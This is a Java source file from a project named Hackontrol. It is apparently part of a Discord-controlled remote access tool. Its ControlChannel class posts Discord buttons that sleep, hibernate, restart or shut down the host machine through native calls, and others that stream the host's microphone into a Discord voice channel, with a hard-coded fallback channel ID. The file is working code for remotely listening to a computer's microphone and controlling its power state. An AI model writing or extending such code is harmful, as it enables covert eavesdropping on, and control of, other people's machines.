package com.khopan.hackontrol.channel.control;

import java.util.List;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.manager.button.Question;
import com.khopan.hackontrol.manager.button.Question.OptionType;
import com.khopan.hackontrol.manager.common.sender.sendable.ChannelSendable;
import com.khopan.hackontrol.manager.common.sender.sendable.ISendable;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.managers.AudioManager;

public class ControlChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "control";

	private static final Button BUTTON_SLEEP = ButtonManager.staticButton(ButtonStyle.SECONDARY, "Sleep", "sleep");
	private static final Button BUTTON_HIBERNATE = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Hibernate", "hibernate");
	private static final Button BUTTON_RESTART = ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", "restart");
	private static final Button BUTTON_SHUTDOWN = ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", "shutdown");

	private static final Button BUTTON_CONNECT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Connect", "connect");
	private static final Button BUTTON_DISCONNECT = ButtonManager.staticButton(ButtonStyle.DANGER, "Disconnect", "disconnect");

	private AudioManager audioManager;
	private MicrophoneSendHandler sendHandler;

	public ControlChannel() {
		Hackontrol.getInstance().setErrorHandler((thread, Errors) -> HackontrolError.throwable(ChannelSendable.of(this.channel), Errors));
	}

	@Override
	public String getName() {
		return ControlChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessage("**Power Control**").addActionRow(ControlChannel.BUTTON_SLEEP, ControlChannel.BUTTON_HIBERNATE, ControlChannel.BUTTON_RESTART, ControlChannel.BUTTON_SHUTDOWN).queue();
		this.channel.sendMessage("**Microphone Control**").addActionRow(ControlChannel.BUTTON_CONNECT, ControlChannel.BUTTON_DISCONNECT).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SLEEP, context -> this.buttonPower(context, PowerAction.SLEEP));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_HIBERNATE, context -> this.buttonPower(context, PowerAction.HIBERNATE));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_RESTART, context -> this.buttonPower(context, PowerAction.RESTART));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN, context -> this.buttonPower(context, PowerAction.SHUTDOWN));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_CONNECT, context -> this.buttonConnect(context, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_DISCONNECT, context -> this.buttonConnect(context, false));
	}

	private void buttonPower(ButtonContext context, PowerAction powerAction) {
		Question.positive(context.reply(), "Are you sure you want to " + powerAction.name().toLowerCase() + '?', OptionType.YES_NO, () -> {
			String message = switch(powerAction) {
			case SLEEP -> NativeLibrary.sleep();
			case HIBERNATE -> NativeLibrary.hibernate();
			case RESTART -> NativeLibrary.restart();
			case SHUTDOWN -> NativeLibrary.shutdown();
			};

			if(message != null) {
				HackontrolError.multiline(context.message(), message.trim());
			}
		});
	}

	private void buttonConnect(ButtonContext context, boolean connect) {
		if((this.sendHandler == null) != connect) {
			HackontrolMessage.boldDeletable(context.reply(), "Microphone is already " + (connect ? "connected" : "disconnected"));
			return;
		}

		Guild guild = context.getGuild();

		if(connect) {
			try {
				if(this.voiceConnect(guild, context.reply(), true)) {
					context.acknowledge();
				}
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.message(), Errors);
			}

			return;
		}

		Question.positive(context.reply(), "Are you sure you want to disconnect?", OptionType.YES_NO, () -> {
			try {
				this.voiceConnect(guild, context.message(), false);
			} catch(Throwable Errors) {
				HackontrolError.throwable(context.message(), Errors);
			}
		});
	}

	private boolean voiceConnect(Guild guild, ISendable sender, boolean connect) throws Throwable {
		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		this.audioManager.closeAudioConnection();

		if(this.sendHandler != null) {
			this.sendHandler.close();
			this.sendHandler = null;
		}

		if(!connect) {
			return true;
		}

		List<VoiceChannel> voiceChannelList = guild.getVoiceChannels();
		VoiceChannel channel;

		if(voiceChannelList.isEmpty()) {
			channel = guild.getVoiceChannelById(1230856739793145919L);
		} else {
			channel = voiceChannelList.get(0);
		}

		if(channel == null) {
			HackontrolError.message(sender, "No voice channels were found");
			return false;
		}

		this.sendHandler = new MicrophoneSendHandler();
		this.audioManager.setSendingHandler(this.sendHandler);
		this.audioManager.setSelfDeafened(true);
		this.audioManager.openAudioConnection(channel);
		return true;
	}

	private static enum PowerAction {
		SLEEP,
		HIBERNATE,
		SHUTDOWN,
		RESTART;
	}
}
